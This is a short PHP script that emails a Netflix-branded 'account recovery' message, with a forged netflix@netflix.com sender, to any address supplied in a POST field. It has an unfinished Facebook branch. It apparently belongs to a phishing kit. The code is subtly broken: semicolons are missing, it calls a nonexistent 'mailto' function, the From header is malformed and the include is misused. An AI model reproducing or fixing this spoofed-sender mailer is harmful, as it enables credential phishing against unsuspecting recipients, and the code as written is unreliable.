<?php
$asunto="";
$msg="";
$mail="";

$facebook_asunto="";
$facebook_msg = "";
$facebook_mail = "";
$netflix_asunto = "RECUPERACION DE CUENTA";
$netflix_msg = include("../netflixmail.html");
$netflix_mail = "netflix@netflix.com";

switch($_POST['pagina']){
    case "facebook": 
    $asunto = $facebook_asunto;
    $msg = $facebook_msg;
    $mail = $facebook_mail break;
    case "netflix": 
    $asunto = $netflix_asunto; 
    $msg = $netflix_msg; 
    $mail = $netflix_mail break;
}

//Headers
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=UTF-8\r\n";
$headers .= "From <".$mail.">";

$bool = mailto($_POST['destino'], $asunto, $msg, $headers);

if($bool){
    echo "ENVIADO";
}else{
    echo "ERROR";
}
?>